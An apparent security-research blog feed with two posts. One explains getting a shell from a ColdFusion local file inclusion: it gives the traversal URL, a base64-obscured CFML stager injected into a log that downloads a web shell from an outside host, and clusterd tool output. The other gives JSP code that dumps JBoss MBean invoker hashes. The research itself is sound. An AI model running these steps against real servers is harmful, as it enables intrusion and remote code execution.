<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: clusterd | forelsec]]></title>
  <link href="http://hatRiot.github.io/blog/categories/clusterd/atom.xml" rel="self"/>
  <link href="http://hatRiot.github.io/"/>
  <updated>2014-05-13T23:34:25-06:00</updated>
  <id>http://hatRiot.github.io/</id>
  <author>
    <name><![CDATA[Bryan Alexander]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[LFI to shell in Coldfusion 6-10]]></title>
    <link href="http://hatRiot.github.io/blog/2014/04/02/lfi-to-stager-payload-in-coldfusion/"/>
    <updated>2014-04-02T15:10:04-06:00</updated>
    <id>http://hatRiot.github.io/blog/2014/04/02/lfi-to-stager-payload-in-coldfusion</id>
    <content type="html"><![CDATA[<p>ColdFusion has <a href="http://www.blackhatlibrary.net/Coldfusion_hacking">several</a> very popular LFI&rsquo;s that are often used to fetch CF hashes, which can then be passed or cracked/reversed.  A lesser use of this LFI, one that I haven&rsquo;t seen documented as of yet, is actually obtaining a shell.  When you can&rsquo;t crack or pass, what&rsquo;s left?</p>

<p>The less-than-obvious solution is to exploit CFML&rsquo;s parser, which acts much in the same way that PHP does when used in HTML.  You can embed PHP into any HTML page, at any location, because of the way the PHP interpreter searches a document for executable code.  This is the foundational basis of log poisoning.  CFML acts in much the same way, and we can use these LFI&rsquo;s to inject CFML and execute it on the remote system.</p>

<p>Let&rsquo;s begin by first identifying the LFI; I&rsquo;ll be using ColdFusion 8 as example.  CF8&rsquo;s LFI lies in the locale parameter:</p>

<p><code>
http://192.168.1.219:8500/CFIDE/administrator/enter.cfm?local=../../../../../../../../ColdFusion8\logs\application.log%00en
</code></p>

<p>When exploited, this will dump the contents of <code>application.log</code>, a logging file that stores error messages.</p>

<p><img src="/images/posts/2014/cf_log.jpg"></p>

<p>We can write to this file by triggering an error, such as attempting to access a nonexistent CFML page.  This log also fails to sanitize data, allowing us to inject any sort of characters we want; including CFML code.</p>

<p>The idea for this is to inject a simple stager payload that will then pull down and store our real payload; in this case, a web shell (something like fuze).  The stager I came up with is as follows:</p>

<p><code>
&lt;cfhttp method='get' url='#ToString(ToBinary('aHR0cDovLzE5Mi4xNjguMS45Nzo4MDAwL2NtZC5jZm1s'))#' path='#ExpandPath(ToString(ToBinary('Li4vLi4v')))#' file='cmd.cfml'&gt;
</code></p>

<p>The <code>cfhttp</code> tag is used to execute an HTTP request for our real payload, the URL of which is base64&rsquo;d to avoid some encoding issues with forward slashes.  We then expand the local path to <code>../../</code> which drops us into <code>wwwroot</code>, which is the first directory accessible from the web server.</p>

<p>Once the stager is injected, we only need to exploit the LFI to retrieve the log file and execute our CFML code:</p>

<p><img src="/images/posts/2014/cf_log_fetch.jpg"></p>

<p>Which we can then access from the root directory:</p>

<p><img src="/images/posts/2014/cf_log_exec.jpg"></p>

<p>A quick run of this in clusterd:</p>

<p>```
$ ./clusterd.py -i 192.168.1.219 -a coldfusion -p8500 -v8 &mdash;deployer lfi_stager &mdash;deploy ./src/lib/resources/cmd.cfml</p>

<pre><code>    clusterd/0.2.1 - clustered attack toolkit
        [Supporting 5 platforms]
</code></pre>

<p> [2014-04-02 11:28PM] Started at 2014-04-02 11:28PM
 [2014-04-02 11:28PM] Servers' OS hinted at windows
 [2014-04-02 11:28PM] Fingerprinting host &lsquo;192.168.1.219&rsquo;
 [2014-04-02 11:28PM] Server hinted at &lsquo;coldfusion&rsquo;
 [2014-04-02 11:28PM] Checking coldfusion version 8.0 ColdFusion Manager&hellip;
 [2014-04-02 11:28PM] Matched 1 fingerprints for service coldfusion
 [2014-04-02 11:28PM]   ColdFusion Manager (version 8.0)
 [2014-04-02 11:28PM] Fingerprinting completed.
 [2014-04-02 11:28PM] Injecting stager&hellip;
 [2014-04-02 11:28PM] Waiting for remote server to download file [7s]]
 [2014-04-02 11:28PM] cmd.cfml deployed at /cmd.cfml
 [2014-04-02 11:28PM] Finished at 2014-04-02 11:28PM</p>

<p>```</p>

<p>The downside to this method is remnance in a log file, which cannot be purged unless the CF server is shutdown (except in CF10).  It also means that the CFML file, if using the web shell, will be hanging around the filesystem.  An alternative is to inject a web shell that exists on-demand, that is, check if an argument is provided to the LFI and only parse and execute then.</p>

<p>A working deployer for this can be found in the latest release of clusterd (v0.2.1).  It is also worth noting that this method is applicable to other CFML engines; details on that, and a working proof of concept, in the near future.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Fetching JBoss MBean method hashes]]></title>
    <link href="http://hatRiot.github.io/blog/2014/01/26/fetching-jboss-mbean-method-hashes/"/>
    <updated>2014-01-26T01:24:19-07:00</updated>
    <id>http://hatRiot.github.io/blog/2014/01/26/fetching-jboss-mbean-method-hashes</id>
    <content type="html"><![CDATA[<p>Matasano published <a href="http://www.matasano.com/research/OWASP3011_Luca.pdf">one</a> of <a href="https://www.redteam-pentesting.de/en/publications/jboss/-bridging-the-gap-between-the-enterprise-and-you-or-whos-the-jboss-now">two</a> canonical papers on JBoss exploitation.  While working on a fresh new tool, I came across the JMXInvokerServlet technique, which uses serialized Java requests to deploy to remote MBeans.  This uses a specific object hash to route the JMX request to the correct MBean; in our case, the gold is jboss.jmx:name=Invoker.</p>

<p>In this paper, Matasano provides the hash for JBoss 4.0.3SP1, but does not list any others, nor show how it derived this.  After perusing the code, however, I found it to be quite simple, and have developed a simple method for fetching hashes of not only the Invoker MBean, but any listed in the JBoss registry.</p>

<p>To extract these values, we simply deploy a WAR file that dumps the entirety of the Registry, which is used for hash lookups when routing requests.  This can can be seen below:</p>

<p>```
&lt;%@ page import=&ldquo;org.jboss.system.Registry&rdquo;%>
&lt;%@ page import=&ldquo;java.io.*&rdquo;%>
&lt;%@ page import=&ldquo;java.util.Map&rdquo;%>
&lt;%@ page import=&ldquo;java.util.Iterator&rdquo;%>
&lt;%</p>

<pre><code>Iterator it = Registry.entries.entrySet().iterator();
while (it.hasNext()){
    Map.Entry pairs = (Map.Entry)it.next();
    out.println(pairs.getKey() + " = " + pairs.getValue() + "&lt;br/&gt;");
    it.remove();
}
</code></pre>

<p>%>
```</p>

<p>When deployed and executed on my local 4.0.5.GA JBoss server, we get:</p>

<p><img class="center" src="/images/posts/2014/jb_hash.jpg"></p>

<p>With this, we&rsquo;ve fetched the hash for the Invoker MBean as well as every other invokable MBean in the registry.  This value appears to be common across all 3.x and 4.x JBoss instances.  However, when run against JBoss 5.x/6.x instances, the following is returned:</p>

<p><img class="center" src="/images/posts/2014/jb_hash_6x.jpg"></p>

<p>This change is due to the way look-ups are performed in 5.x; instead of the key being an Integer (hash), the key is now an Object, as shown below:</p>

<p><code>
public static Map&lt;Object, Object&gt; entries = new ConcurrentHashMap&lt;Object, Object&gt;();
</code></p>

<p>To further enumerate this, we can iterate over the class methods and pull all of their hashes and hash codes:</p>

<p>```
&lt;%@ page import=&ldquo;java.io.*&rdquo;%>
&lt;%@ page import=&ldquo;java.util.Map&rdquo;%>
&lt;%@ page import=&ldquo;java.util.Iterator&rdquo;%>
&lt;%@ page import=&ldquo;java.lang.reflect.Method&rdquo;%>
&lt;%@ page import=&ldquo;org.jboss.system.Registry&rdquo;%>
&lt;%@ page import=&ldquo;javax.management.ObjectName&rdquo;%>
&lt;%@ page import=&ldquo;org.jboss.invocation.MarshalledInvocation&rdquo;%>
&lt;%</p>

<pre><code>Iterator it = Registry.entries.entrySet().iterator();
while (it.hasNext()){
    Map.Entry pairs = (Map.Entry)it.next();
    out.println(pairs.getKey() + " = " + pairs.getValue() + "&lt;br/&gt;");

    // check for ObjectName
    if (pairs.getKey() instanceof ObjectName){
        Long hash;
        Method[] methods = pairs.getValue().getClass().getMethods();
        for (int m = 0; m &lt; methods.length; ++m){
            Method method = methods[m];
            hash = new Long(MarshalledInvocation.calculateHash(method));
            out.println("Method: " + method + "  Hash: " + hash + " (" + method.hashCode() + ")" + "&lt;br/&gt;");
        }
    }

    out.println("Key class: " + pairs.getKey().getClass() + "&lt;br/&gt;");
    it.remove();
}
</code></pre>

<p>%>
```</p>

<p>Which gives us:</p>

<p><img class="center" src="/images/posts/2014/jb_6x_methods.jpg"></p>

<p>Judging by this information, it doesn&rsquo;t appear that we can remotely invoke the same way we did with 3.x/4.x.  This is the fundamental issue with several of the available open source JBoss tools (Metasploit); none of them take into account the changes between different versions of JBoss.</p>

<p>Although I have yet to discover a way to map requests to the invoker (I&rsquo;m not entirely sure its possible) in these later versions, I have a suspicion that we may be able to map these requests by serializing objects out.  More on this, and my exploitation tool, soon.</p>
]]></content>
  </entry>
  
</feed>
